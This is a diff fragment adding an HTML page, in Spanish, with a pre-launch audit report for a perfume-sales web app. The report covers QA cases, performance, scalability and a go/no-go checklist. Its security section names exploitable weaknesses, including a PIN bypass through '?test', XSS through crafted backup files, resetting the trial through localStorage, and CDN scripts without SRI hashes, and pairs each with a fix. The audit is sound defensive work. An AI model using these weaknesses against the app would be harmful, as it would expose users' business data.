+        <tr><td>BUG-17</td><td>fillSuggestions() reconstruye datalists completos en cada llamada → O(n) repetido</td><td>Línea ~2619</td><td class="c-warn">Medio</td></tr>
+        <tr><td>BUG-18</td><td>exportarVentasCSV usa <code>v.precio</code> (campo viejo) en lugar de <code>v.precioVenta</code></td><td>Línea ~2097</td><td class="c-bad">Alto</td></tr>
+        <tr><td>BUG-19</td><td>renderMetaBar() falla silenciosamente si 'meta-bar-fill' no existe en el DOM</td><td>Línea ~2695</td><td class="c-warn">Bajo</td></tr>
+        <tr><td>BUG-20</td><td>El tour de onboarding no maneja el caso de que el target element no exista en el DOM</td><td>Línea ~5047</td><td class="c-warn">Bajo</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════
+     FASE 3 — QA EXTREMO
+══════════════════════════════════════════════════════════ -->
+<div class="phase" id="f3">
+  <div class="phase-header">
+    <div class="phase-num">3</div>
+    <div>
+      <div class="phase-title">QA Extremo</div>
+      <div class="phase-subtitle">Simulación de 5 tipos de usuario — comportamientos inesperados</div>
+    </div>
+  </div>
+
+  <div class="g2">
+    <div class="card">
+      <div class="card-title">👶 Usuario principiante</div>
+      <div style="display:flex;flex-direction:column;gap:7px">
+        <div class="callout warn"><span class="callout-icon">⚠</span><div><strong>Confusión: "precio compra" vs "precio venta"</strong> — El formulario no explica la diferencia. Una principiante puede invertir los campos y registrar ganancia negativa sin querer.</div></div>
+        <div class="callout warn"><span class="callout-icon">⚠</span><div><strong>Trial limit sin contexto</strong> — Cuando se alcanza el límite de ventas en trial, aparece un toast. No hay modal explicativo de qué es el "plan" ni cómo activar.</div></div>
+        <div class="callout info"><span class="callout-icon">✓</span><div>El onboarding paso a paso es claro y bien diseñado. La bienvenida tiene buen copy.</div></div>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-title">😈 Usuario malicioso</div>
+      <div style="display:flex;flex-direction:column;gap:7px">
+        <div class="callout danger"><span class="callout-icon">🚨</span><div><strong>PIN bypass confirmado</strong> — Navegar a <code>?test</code> omite el PIN (BUG-01).</div></div>
+        <div class="callout danger"><span class="callout-icon">🚨</span><div><strong>Backup malicioso</strong> — Puede ejecutar XSS via foto de perfume o nombre con HTML (BUG-02, BUG-03).</div></div>
+        <div class="callout danger"><span class="callout-icon">🚨</span><div><strong>DevTools → localStorage</strong> — Puede ver token HMAC, email, número de WhatsApp, datos de negocio.</div></div>
+        <div class="callout warn"><span class="callout-icon">⚠</span><div><strong>Licencia infinita</strong> — Puede manipular <code>pt_trial_start</code> en localStorage para reiniciar el trial. El rate limiting está desactivado (BUG-04).</div></div>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-title">🤦 Usuario distraído</div>
+      <div style="display:flex;flex-direction:column;gap:7px">
+        <div class="callout warn"><span class="callout-icon">⚠</span><div><strong>Doble tap en "Guardar venta"</strong> — El flag <code>_addVentaEnProceso</code> protege contra doble registro. CORRECTO. Pero el botón tarda 1 frame en deshabilitarse visualmente.</div></div>
+        <div class="callout warn"><span class="callout-icon">⚠</span><div><strong>Formulario incompleto</strong> — Si la usuaria deja el precio de compra en $0, aparece un toast de advertencia pero DEJA GUARDAR. Ganancia inflada silenciosamente.</div></div>
+        <div class="callout warn"><span class="callout-icon">⚠</span><div><strong>Cambio de tab con formulario lleno</strong> — El borrador se guarda automáticamente (bien). Pero si va a Ventas, vuelve, y el borrador tiene datos viejos, puede confundirse.</div></div>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-title">💪 Usuario avanzado que intenta romper</div>
+      <div style="display:flex;flex-direction:column;gap:7px">
+        <div class="callout danger"><span class="callout-icon">🚨</span><div><strong>Precio = 99999999</strong> — Bloqueado correctamente con validación de 10M. BIEN.</div></div>
+        <div class="callout danger"><span class="callout-icon">🚨</span><div><strong>Descuento = 101%</strong> — Bloqueado con validación. BIEN.</div></div>
+        <div class="callout warn"><span class="callout-icon">⚠</span><div><strong>10.000 ventas</strong> — El virtual scroll con IntersectionObserver cargaría en lotes de 20. A 10k ventas, el tiempo de parseo inicial desde IndexedDB y el render de todos los separadores de mes puede tardar 2-3 segundos en móvil económico.</div></div>
+        <div class="callout warn"><span class="callout-icon">⚠</span><div><strong>Fecha 29/02/2023</strong> — Año no bisiesto. <code>new Date(2023, 1, 29)</code> retorna March 1 en JavaScript, parseando como mes siguiente. Los filtros de mes mostrarían esta venta en el mes equivocado.</div></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card" style="margin-top:12px">
+    <div class="card-title">Casos límite críticos verificados</div>
+    <table>
+      <thead><tr><th>Caso</th><th>Comportamiento actual</th><th>Esperado</th><th>Estado</th></tr></thead>
+      <tbody>
+        <tr><td>Precio venta = 0.01</td><td>Acepta, ganancia casi negativa</td><td>Aceptar con warning</td><td class="c-ok">✓ OK</td></tr>
+        <tr><td>Nombre perfume = "" (vacío)</td><td>Bloquea con error inline</td><td>Bloquear</td><td class="c-ok">✓ OK</td></tr>
+        <tr><td>Nombre perfume = "A" × 500 caracteres</td><td>Acepta sin límite de longitud</td><td>Máx 100 chars</td><td class="c-bad">✗ BUG</td></tr>
+        <tr><td>Nombre perfume con emojis 🍶🌸</td><td>Acepta y renderiza correctamente</td><td>Aceptar</td><td class="c-ok">✓ OK</td></tr>
+        <tr><td>Cuotas = 0</td><td><code>parseInt("") || 2</code> → usa 2 cuotas por defecto</td><td>Usar mínimo 1</td><td class="c-ok">✓ OK</td></tr>
+        <tr><td>Cuotas = 999</td><td>Acepta, genera 999 items en el panel</td><td>Límite razonable (max 24)</td><td class="c-bad">✗ BUG</td></tr>
+        <tr><td>Backup JSON de 50MB</td><td>FileReader lo carga completo en memoria antes de parsear</td><td>Validar tamaño antes</td><td class="c-bad">✗ BUG</td></tr>
+        <tr><td>Data URL foto = 10MB JPEG</td><td>Se comprime a 400px max, ~30-50KB</td><td>Comprimir</td><td class="c-ok">✓ OK</td></tr>
+        <tr><td>Cambiar tema durante carga inicial</td><td>FOUC posible si CSS no cargó aún</td><td>Sin flash</td><td class="c-warn">⚠ Parcial</td></tr>
+        <tr><td>Offline al guardar venta</td><td>IndexedDB local — funciona sin red</td><td>Funcionar offline</td><td class="c-ok">✓ OK</td></tr>
+        <tr><td>Mismo perfil en 2 tabs a la vez</td><td>Datos divergen entre tabs</td><td>Sincronizar via BroadcastChannel</td><td class="c-bad">✗ BUG</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════
+     FASE 4 — SEGURIDAD
+══════════════════════════════════════════════════════════ -->
+<div class="phase" id="f4">
+  <div class="phase-header">
+    <div class="phase-num">4</div>
+    <div>
+      <div class="phase-title">Seguridad — Análisis Completo</div>
+      <div class="phase-subtitle">Pensando como atacante. Sin asumir nada.</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">Matriz de vulnerabilidades</div>
+    <table>
+      <thead><tr><th>Vulnerabilidad</th><th>Vector</th><th>Severidad</th><th>Explotabilidad</th><th>Estado</th></tr></thead>
+      <tbody>
+        <tr><td><strong>PIN bypass via ?test</strong></td><td>URL manipulation</td><td class="c-bad">CRÍTICA</td><td class="c-bad">Trivial</td><td class="c-bad">CONFIRMADO</td></tr>
+        <tr><td><strong>XSS via p.foto en innerHTML</strong></td><td>Malicious backup file</td><td class="c-bad">CRÍTICA</td><td class="c-warn">Media</td><td class="c-bad">CONFIRMADO</td></tr>
+        <tr><td><strong>XSS via p.nombre en toast()</strong></td><td>Malicious backup file</td><td class="c-bad">CRÍTICA</td><td class="c-warn">Media</td><td class="c-bad">CONFIRMADO</td></tr>
+        <tr><td><strong>No rate limiting en /backup</strong></td><td>KV no configurado</td><td class="c-bad">ALTA</td><td class="c-bad">Trivial</td><td class="c-bad">ACTIVO</td></tr>
+        <tr><td><strong>onclick injection via mes variable</strong></td><td>Malicious backup (fecha)</td><td class="c-warn">ALTA</td><td class="c-warn">Media</td><td class="c-bad">CONFIRMADO</td></tr>
+        <tr><td><strong>Token HMAC en localStorage</strong></td><td>XSS secundario</td><td class="c-warn">ALTA</td><td class="c-warn">Media</td><td class="c-bad">CONFIRMADO</td></tr>
+        <tr><td><strong>CDN sin SRI hashes</strong></td><td>CDN compromise / MITM</td><td class="c-warn">ALTA</td><td class="c-ok">Difícil</td><td class="c-bad">ACTIVO</td></tr>
+        <tr><td>localStorage legible por mismo origen</td><td>Browser extension maliciosa</td><td class="c-warn">MEDIA</td><td class="c-warn">Media</td><td class="c-bad">INHERENTE</td></tr>
+        <tr><td>Backup JSON sin cifrar</td><td>Archivo interceptado</td><td class="c-warn">MEDIA</td><td class="c-ok">Difícil</td><td class="c-bad">ACTIVO</td></tr>
+        <tr><td>License token predecible (HMAC conocido)</td><td>Código interceptado</td><td class="c-ok">BAJA</td><td class="c-ok">Muy difícil</td><td class="c-ok">CONTROLADO</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="card" style="margin-top:12px">
+    <div class="card-title">Lo que funciona bien (reconocimiento honesto)</div>
+    <div style="display:flex;flex-direction:column;gap:7px">
+      <div class="callout success"><span class="callout-icon">✅</span><div><strong>HMAC-SHA256 para licencias</strong> — Token criptográfico sólido. La comparación <code>timingSafeEqual()</code> previene timing attacks. Bien implementado.</div></div>
+      <div class="callout success"><span class="callout-icon">✅</span><div><strong>escapeHTML() usada correctamente en la mayoría de casos</strong> — Ventas, gastos, clientes, notas, proveedores están sanitizados en todos los renders principales.</div></div>
+      <div class="callout success"><span class="callout-icon">✅</span><div><strong>PIN hasheado con SHA-256</strong> — No se guarda el PIN en texto plano. El hash se almacena en localStorage.</div></div>
+      <div class="callout success"><span class="callout-icon">✅</span><div><strong>X-Frame-Options: DENY</strong> — Protección contra clickjacking configurada en _headers.</div></div>
+      <div class="callout success"><span class="callout-icon">✅</span><div><strong>IndexedDB en lugar de localStorage</strong> — Migración correcta a IDB con mayor capacidad.</div></div>
+      <div class="callout success"><span class="callout-icon">✅</span><div><strong>AbortSignal.timeout(15000)</strong> — Los fetch de backup tienen timeout. Previene requests colgados.</div></div>
+      <div class="callout success"><span class="callout-icon">✅</span><div><strong>PIN lockout en memoria (_failsMem)</strong> — Resistente a borrado de localStorage en la misma sesión.</div></div>
+    </div>
+  </div>
+
+  <div class="card" style="margin-top:12px">
+    <div class="card-title">Plan de corrección de seguridad — por prioridad</div>
+    <table>
+      <thead><tr><th>#</th><th>Fix</th><th>Esfuerzo</th><th>Impacto</th></tr></thead>
+      <tbody>
+        <tr><td>1</td><td>Eliminar línea del PIN bypass <code>?test</code></td><td class="c-ok">5 min</td><td class="c-bad">CRÍTICO</td></tr>
+        <tr><td>2</td><td>Escapar <code>p.foto</code> en renderStock() y renderCatalogo()</td><td class="c-ok">10 min</td><td class="c-bad">CRÍTICO</td></tr>
+        <tr><td>3</td><td>Escapar <code>p.nombre</code> en todos los toast() calls</td><td class="c-ok">30 min</td><td class="c-bad">CRÍTICO</td></tr>
+        <tr><td>4</td><td>Configurar KV namespace real en Cloudflare</td><td class="c-ok">10 min</td><td class="c-bad">CRÍTICO</td></tr>
+        <tr><td>5</td><td>Cambiar onclick="eliminarMes('${mes}')" a data-attribute</td><td class="c-ok">20 min</td><td class="c-warn">ALTO</td></tr>
+        <tr><td>6</td><td>Agregar SRI hashes a CDN scripts</td><td class="c-warn">1 hora</td><td class="c-warn">ALTO</td></tr>
+        <tr><td>7</td><td>Validar URL foto como https:// antes de guardar</td><td class="c-ok">15 min</td><td class="c-warn">ALTO</td></tr>
+        <tr><td>8</td><td>Agregar max-length validation a campo nombre perfume (100 chars)</td><td class="c-ok">5 min</td><td class="c-warn">MEDIO</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════
+     FASE 5 — UX/UI
+══════════════════════════════════════════════════════════ -->
+<div class="phase" id="f5">
+  <div class="phase-header">
+    <div class="phase-num">5</div>
+    <div>
+      <div class="phase-title">UX / UI</div>
+      <div class="phase-subtitle">Navegación, comprensión, estados vacíos, accesibilidad, responsive</div>
+    </div>
+  </div>
+
+  <div class="g2">
+    <div class="card">
+      <div class="card-title">✅ Aciertos de UX</div>
+      <div style="display:flex;flex-direction:column;gap:6px">
+        <div class="callout success"><span class="callout-icon">✅</span><div>Feedback visual inmediato en todos los formularios (inline errors)</div></div>
+        <div class="callout success"><span class="callout-icon">✅</span><div>Haptic feedback para acciones críticas (guardar, borrar, cobrar)</div></div>
+        <div class="callout success"><span class="callout-icon">✅</span><div>Sistema de UNDO (deshacer) para borrar ventas, gastos, stock</div></div>
+        <div class="callout success"><span class="callout-icon">✅</span><div>Estados vacíos con CTAs accionables en todas las listas</div></div>
+        <div class="callout success"><span class="callout-icon">✅</span><div>Swipe-to-reveal en ventas para cobrar/borrar en mobile</div></div>
+        <div class="callout success"><span class="callout-icon">✅</span><div>Borrador de formulario persiste entre tabs</div></div>
+        <div class="callout success"><span class="callout-icon">✅</span><div>Preview de ganancia calculada en tiempo real</div></div>
+        <div class="callout success"><span class="callout-icon">✅</span><div>Scroll position preservado entre cambios de tab</div></div>
+        <div class="callout success"><span class="callout-icon">✅</span><div>Touch targets ≥44px en botones principales (cumple HIG/Material)</div></div>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-title">❌ Problemas de UX identificados</div>
+      <div style="display:flex;flex-direction:column;gap:6px">
+        <div class="callout danger"><span class="callout-icon">🚨</span><div><strong>Sin feedback si IndexedDB falla</strong> — El usuario no sabe que sus datos no se guardaron (BUG-08)</div></div>
+        <div class="callout warn"><span class="callout-icon">⚠</span><div><strong>"Precio compra = $0" solo avisa, no bloquea</strong> — Una usuaria puede registrar 100 ventas con ganancia falsa sin darse cuenta</div></div>
+        <div class="callout warn"><span class="callout-icon">⚠</span><div><strong>Backup: el timestamp se actualiza aunque la descarga falle</strong> — Falsa sensación de seguridad</div></div>
+        <div class="callout warn"><span class="callout-icon">⚠</span><div><strong>Cuotas = 999</strong> — No hay límite de cuotas. 999 cuotas genera un panel de 999 items</div></div>
+        <div class="callout warn"><span class="callout-icon">⚠</span><div><strong>Eliminar mes sin segundo factor</strong> — Un click accidental borra todas las ventas del mes. El <code>showConfirm()</code> existe pero el botón es fácilmente clickeable en mobile</div></div>
+        <div class="callout warn"><span class="callout-icon">⚠</span><div><strong>Sin indicador de carga al cambiar de tab</strong> — En dispositivos lentos, si IndexedDB tarda, la pantalla parece congelada</div></div>
+        <div class="callout warn"><span class="callout-icon">⚠</span><div><strong>Accesibilidad incompleta</strong> — Muchos modales no tienen <code>role="dialog"</code>, <code>aria-modal</code>, ni gestión de focus trap</div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════
+     FASE 6 — RENDIMIENTO
+══════════════════════════════════════════════════════════ -->
+<div class="phase" id="f6">
+  <div class="phase-header">
+    <div class="phase-num">6</div>
+    <div>
+      <div class="phase-title">Rendimiento</div>
+      <div class="phase-subtitle">Carga, memoria, re-renders, degradación con datos reales</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">Análisis de complejidad y puntos de degradación</div>
+    <table>
+      <thead><tr><th>Operación</th><th>Complejidad</th><th>50 ventas</th><th>1.000 ventas</th><th>10.000 ventas</th></tr></thead>
+      <tbody>
+        <tr><td><strong>renderVentas()</strong></td><td>O(n) + virtual scroll</td><td class="c-ok">&lt;5ms</td><td class="c-ok">&lt;30ms</td><td class="c-warn">~200ms</td></tr>
+        <tr><td><strong>renderGanancias()</strong></td><td>O(n) múltiples pasadas</td><td class="c-ok">&lt;10ms</td><td class="c-warn">~80ms</td><td class="c-bad">~800ms</td></tr>
+        <tr><td><strong>mesesDeVentas()</strong></td><td>O(n) con Set</td><td class="c-ok">&lt;1ms</td><td class="c-ok">&lt;10ms</td><td class="c-warn">~100ms</td></tr>
+        <tr><td><strong>Carga inicial (loadProfile)</strong></td><td>IDB async</td><td class="c-ok">&lt;100ms</td><td class="c-warn">~300ms</td><td class="c-bad">~1.5s</td></tr>
+        <tr><td><strong>fillSuggestions()</strong></td><td>O(n) × 4 campos</td><td class="c-ok">&lt;5ms</td><td class="c-warn">~50ms</td><td class="c-bad">~500ms</td></tr>
+        <tr><td><strong>renderChartMeses()</strong></td><td>O(n×m) meses×ventas</td><td class="c-ok">&lt;50ms</td><td class="c-warn">~200ms</td><td class="c-bad">~2s</td></tr>
+        <tr><td><strong>exportExcel()</strong></td><td>O(n) + XLSX lib</td><td class="c-ok">&lt;500ms</td><td class="c-warn">~2s</td><td class="c-bad">10s+</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="g2" style="margin-top:12px">
+    <div class="card">
+      <div class="card-title">Problemas de rendimiento críticos</div>
+      <div style="display:flex;flex-direction:column;gap:7px">
+        <div class="callout danger"><span class="callout-icon">🚨</span><div><strong>renderGanancias() llama renderChartMeses() en cada render</strong> — Chart.js destruye y recrea el canvas cada vez. Para 12+ meses de datos esto es notablemente lento.</div></div>
+        <div class="callout warn"><span class="callout-icon">⚠</span><div><strong>fillSuggestions() reconstruye datalists completos</strong> — Se llama al entrar a la tab "Nueva venta" y genera 4 iteraciones sobre todas las ventas.</div></div>
+        <div class="callout warn"><span class="callout-icon">⚠</span><div><strong>updateStats() se llama después de cada operación</strong> — Recalcula todos los headers estadísticos. Debería ser lazy/debounced.</div></div>
+        <div class="callout warn"><span class="callout-icon">⚠</span><div><strong>File de 422 KB (index.html) sin compresión garantizada</strong> — Si el servidor no envía gzip/brotli, la carga inicial en red 3G es ~4 segundos.</div></div>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-title">Simulación: celular económico + 3G</div>
+      <div style="display:flex;flex-direction:column;gap:6px">
+        <div class="callout info"><span class="callout-icon">📱</span><div><strong>Primera carga (sin caché):</strong> 422KB HTML + fuentes (~150KB) + Service Worker = ~600KB. En 3G (~1 Mbps): ~5 segundos para LCP.</div></div>
+        <div class="callout info"><span class="callout-icon">📱</span><div><strong>Segunda carga (con SW):</strong> Service Worker sirve todo desde caché. &lt;500ms. Este es el caso normal de uso.</div></div>
+        <div class="callout warn"><span class="callout-icon">⚠</span><div><strong>Con 500 ventas y fotos de perfumes</strong> (base64 en IDB): La serialización JSON al hacer backup puede superar 20MB, congelando el thread principal.</div></div>
+        <div class="callout success"><span class="callout-icon">✅</span><div><strong>Virtual scroll implementado</strong> — Las ventas se renderizan en lotes con IntersectionObserver. Esto es correcto y escala bien.</div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════
+     FASE 7 — ESCALABILIDAD
+══════════════════════════════════════════════════════════ -->
+<div class="phase" id="f7">
+  <div class="phase-header">
+    <div class="phase-num">7</div>
+    <div>
+      <div class="phase-title">Escalabilidad</div>
+      <div class="phase-subtitle">Arquitectura, deuda técnica, qué falla primero</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">Qué falla primero según cantidad de usuarios</div>
+    <table>
+      <thead><tr><th>Usuarios</th><th>Qué falla primero</th><th>Causa</th><th>Acción requerida</th></tr></thead>
+      <tbody>
+        <tr><td><strong>100</strong></td><td class="c-ok">Nada crítico</td><td>Cloudflare absorbe</td><td>—</td></tr>
+        <tr><td><strong>500</strong></td><td class="c-warn">Rate limiting inactive</td><td>KV no configurado</td><td>Crear KV namespace (5 min)</td></tr>
+        <tr><td><strong>1.000</strong></td><td class="c-warn">Límites de R2 gratis</td><td>100k operaciones/mes gratis</td><td>Pagar plan Workers $5/mes</td></tr>
+        <tr><td><strong>5.000</strong></td><td class="c-bad">Mantenimiento del monolito</td><td>7k líneas = imposible de debuggear/extender</td><td>Separar JS en módulos</td></tr>
+        <tr><td><strong>10.000</strong></td><td class="c-bad">Sin analytics de producto</td><td>Datos locales = no se sabe qué usa la gente</td><td>Opt-in telemetría anonimizada</td></tr>
+        <tr><td><strong>100.000</strong></td><td class="c-bad">Arquitectura completa</td><td>Sin backend central, sin multi-device sync, sin API</td><td>Reescritura con Hono + D1 + API</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="card" style="margin-top:12px">
+    <div class="card-title">Deuda técnica clasificada</div>
+    <div class="g2">
+      <div>
+        <div class="section-head" style="color:var(--red)">Deuda crítica (bloquea crecimiento)</div>
+        <div class="bug crit" style="margin-bottom:8px">
+          <span class="bug-icon">1</span>
+          <div class="bug-body"><strong>Monolito de 7.009 líneas</strong><p>Sin separación de concerns. CSS, HTML, JS, lógica de negocio, estado global todo mezclado. Imposible hacer code review, unit testing o trabajar en equipo.</p></div>
+        </div>
+        <div class="bug crit">
+          <span class="bug-icon">2</span>
+          <div class="bug-body"><strong>Sin tests automatizados</strong><p>Un cambio en la fórmula de ganancia puede romper el cálculo de cuotas sin saberlo. Zero safety net.</p></div>
+        </div>
+      </div>
+      <div>
+        <div class="section-head" style="color:var(--orange)">Deuda alta (limita expansión)</div>
+        <div class="bug high" style="margin-bottom:8px">
+          <span class="bug-icon">3</span>
+          <div class="bug-body"><strong>Hardcoded español argentino</strong><p>Formato de moneda <code>'es-AR'</code>, fechas DD/MM/YYYY, terminología local. Expansión a México/Colombia requiere changes masivos.</p></div>
+        </div>
+        <div class="bug high">
+          <span class="bug-icon">4</span>
+          <div class="bug-body"><strong>Schema IDB version 1 fijo</strong><p>Agregar un nuevo campo a ventas requiere una migración de IDB. Sin versioning planificado, las migraciones futuras serán dolorosas.</p></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════
+     FASE 8 — COMPLETITUD DEL PRODUCTO
+══════════════════════════════════════════════════════════ -->
+<div class="phase" id="f8">
+  <div class="phase-header">
+    <div class="phase-num">8</div>
+    <div>
+      <div class="phase-title">Completitud del Producto</div>
+      <div class="phase-subtitle">Qué falta, qué es obligatorio antes del lanzamiento, qué es premium</div>
+    </div>
+  </div>
+
+  <div class="g2">
+    <div class="card">
+      <div class="card-title">🔴 Obligatorio antes de lanzar a 100k usuarios</div>
+      <table>
+        <tbody>
+          <tr><td>1. Corregir los 4 bugs críticos de seguridad</td><td class="c-bad">URGENTE</td></tr>
+          <tr><td>2. Configurar KV namespace real</td><td class="c-bad">URGENTE</td></tr>
+          <tr><td>3. Feedback cuando IndexedDB falla</td><td class="c-warn">Alta</td></tr>
+          <tr><td>4. Límite de cuotas máximas (max 24)</td><td class="c-warn">Alta</td></tr>
+          <tr><td>5. Max-length en nombre perfume y campos texto</td><td class="c-warn">Alta</td></tr>
+          <tr><td>6. Validar URL de foto como https:// solamente</td><td class="c-warn">Alta</td></tr>
+          <tr><td>7. Términos de uso y privacidad mínimos</td><td class="c-warn">Alta</td></tr>
+          <tr><td>8. Página 404 y error handling para rutas inválidas</td><td class="c-ok">Media</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="card">
+      <div class="card-title">🟢 Features premium para aumentar LTV</div>
+      <table>
+        <tbody>
+          <tr><td>Link de catálogo compartible (URL pública)</td><td class="c-bad">Impacto alto</td></tr>
+          <tr><td>Pago self-service (Stripe/MercadoPago)</td><td class="c-bad">Impacto crítico</td></tr>
+          <tr><td>Resumen semanal automático por WhatsApp</td><td class="c-warn">Impacto alto</td></tr>
+          <tr><td>Programa de afiliados con código único</td><td class="c-warn">Impacto alto</td></tr>
+          <tr><td>Multi-device sync en tiempo real</td><td class="c-warn">Impacto alto</td></tr>
+          <tr><td>IA de análisis de ventas (Claude API)</td><td class="c-ok">Impacto medio</td></tr>
+          <tr><td>Exportar catálogo a PDF con logo propio</td><td class="c-ok">Impacto medio</td></tr>
+          <tr><td>Múltiples monedas (ARS, UYU, COP, MXN)</td><td class="c-ok">Impacto medio</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <div class="card" style="margin-top:12px">
+    <div class="card-title">🗑 Funcionalidades a revisar/eliminar</div>
+    <div class="g2">
+      <div class="callout warn"><span class="callout-icon">⚠</span><div><strong>Línea <code>?test</code> PIN bypass</strong> — Eliminar inmediatamente. Probablemente quedó de desarrollo.</div></div>
+      <div class="callout warn"><span class="callout-icon">⚠</span><div><strong>Buscar en Pinterest</strong> (<code>buscarEnPinterest()</code>) — Abre un tab externo para buscar fotos. Es un nice-to-have que agrega superficie de ataque innecesaria.</div></div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════
+     FASE 9 — CHECKLIST DE PRODUCCIÓN
+══════════════════════════════════════════════════════════ -->
+<div class="phase" id="f9">
+  <div class="phase-header">
+    <div class="phase-num">9</div>
+    <div>
+      <div class="phase-title">Checklist de Producción</div>
+      <div class="phase-subtitle">Go / No-Go para lanzamiento a 100.000 usuarios</div>
+    </div>
+  </div>
+
+  <div class="g2">
+    <div class="card">
+      <div class="card-title">Seguridad</div>
+      <div class="checklist">
+        <div class="ci fail"><span class="ci-icon">❌</span><div><strong>PIN bypass eliminado</strong><p>?test bypasea el PIN — NO LANZAR sin fix</p></div></div>
+        <div class="ci fail"><span class="ci-icon">❌</span><div><strong>XSS en p.foto corregido</strong><p>Confirmado en renderStock y renderCatalogo</p></div></div>
+        <div class="ci fail"><span class="ci-icon">❌</span><div><strong>XSS en toast() corregido</strong><p>p.nombre sin escapeHTML en al menos 1 lugar</p></div></div>
+        <div class="ci fail"><span class="ci-icon">❌</span><div><strong>KV namespace configurado</strong><p>Rate limiting inactivo en producción</p></div></div>
+        <div class="ci fail"><span class="ci-icon">❌</span><div><strong>SRI hashes en CDN scripts</strong><p>Chart.js, jsPDF, XLSX sin integridad verificada</p></div></div>
+        <div class="ci pass"><span class="ci-icon">✅</span><div><strong>HTTPS obligatorio</strong><p>Cloudflare Pages fuerza HTTPS automáticamente</p></div></div>
+        <div class="ci pass"><span class="ci-icon">✅</span><div><strong>X-Frame-Options: DENY</strong><p>Configurado en _headers</p></div></div>
+        <div class="ci pass"><span class="ci-icon">✅</span><div><strong>HMAC-SHA256 para licencias</strong><p>Implementado correctamente con timingSafeEqual</p></div></div>
+        <div class="ci warn"><span class="ci-icon">⚠</span><div><strong>CSP sin unsafe-inline</strong><p>Requiere refactoring del monolito para eliminarlo</p></div></div>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-title">Funcionalidad</div>
+      <div class="checklist">
+        <div class="ci fail"><span class="ci-icon">❌</span><div><strong>backup con 0 ventas funciona</strong><p>_validarSchemaBackup bloquea incorrectamente</p></div></div>
+        <div class="ci fail"><span class="ci-icon">❌</span><div><strong>Feedback en error de storage</strong><p>IndexedDB fallo silencioso</p></div></div>
+        <div class="ci fail"><span class="ci-icon">❌</span><div><strong>Stock no puede ser negativo</strong><p>parseInt puede guardar valores negativos</p></div></div>
+        <div class="ci pass"><span class="ci-icon">✅</span><div><strong>Doble envío de formulario prevenido</strong><p>_addVentaEnProceso flag funciona</p></div></div>
+        <div class="ci pass"><span class="ci-icon">✅</span><div><strong>Validación de fechas futuras</strong><p>max=todayISO() + verificación JS</p></div></div>
+        <div class="ci pass"><span class="ci-icon">✅</span><div><strong>Offline funciona</strong><p>Service Worker + IndexedDB</p></div></div>
+        <div class="ci pass"><span class="ci-icon">✅</span><div><strong>Backup restore con confirmación</strong><p>showConfirm antes de sobrescribir datos</p></div></div>
+        <div class="ci warn"><span class="ci-icon">⚠</span><div><strong>Cuotas máx limitadas</strong><p>Actualmente acepta 999 cuotas</p></div></div>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-title">UX / Responsive</div>
+      <div class="checklist">
+        <div class="ci pass"><span class="ci-icon">✅</span><div><strong>Mobile-first design</strong><p>Bottom nav, touch targets ≥44px</p></div></div>
+        <div class="ci pass"><span class="ci-icon">✅</span><div><strong>Dark/light mode automático</strong><p>prefers-color-scheme implementado</p></div></div>
+        <div class="ci pass"><span class="ci-icon">✅</span><div><strong>iOS safe area insets</strong><p>env(safe-area-inset-*) implementado</p></div></div>
+        <div class="ci warn"><span class="ci-icon">⚠</span><div><strong>ARIA roles en modales</strong><p>Falta role="dialog" y aria-modal en varios modales</p></div></div>
+        <div class="ci warn"><span class="ci-icon">⚠</span><div><strong>Focus trap en modales</strong><p>Sin gestión de focus para accesibilidad</p></div></div>
+        <div class="ci pass"><span class="ci-icon">✅</span><div><strong>Estados vacíos definidos</strong><p>Todos los listados tienen estado vacío con CTA</p></div></div>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-title">Rendimiento / SEO</div>
+      <div class="checklist">
+        <div class="ci pass"><span class="ci-icon">✅</span><div><strong>Lazy loading de CDNs</strong><p>Chart.js, jsPDF, XLSX se cargan solo cuando se usan</p></div></div>
+        <div class="ci pass"><span class="ci-icon">✅</span><div><strong>Virtual scroll en ventas</strong><p>IntersectionObserver en lotes de 20</p></div></div>
+        <div class="ci pass"><span class="ci-icon">✅</span><div><strong>Debounce en búsqueda y save()</strong><p>280ms en búsqueda, 500ms en save</p></div></div>
+        <div class="ci warn"><span class="ci-icon">⚠</span><div><strong>Imágenes de perfumes comprimidas</strong><p>Comprime a 400px/72% JPEG — bien para fotos, no verifica SVG/PNG grandes</p></div></div>
+        <div class="ci pass"><span class="ci-icon">✅</span><div><strong>SEO meta tags completos</strong><p>OG, Twitter card, JSON-LD, canonical, Plausible</p></div></div>
+        <div class="ci warn"><span class="ci-icon">⚠</span><div><strong>app-screenshot.webp en landing</strong><p>WebP óptimo ✓ Pero no tiene width/height declarados (CLS)</p></div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════
+     FASE 10 — INFORME FINAL
+══════════════════════════════════════════════════════════ -->
+<div class="phase" id="f10">
+  <div class="phase-header">
+    <div class="phase-num">10</div>
+    <div>
+      <div class="phase-title">Informe Final</div>
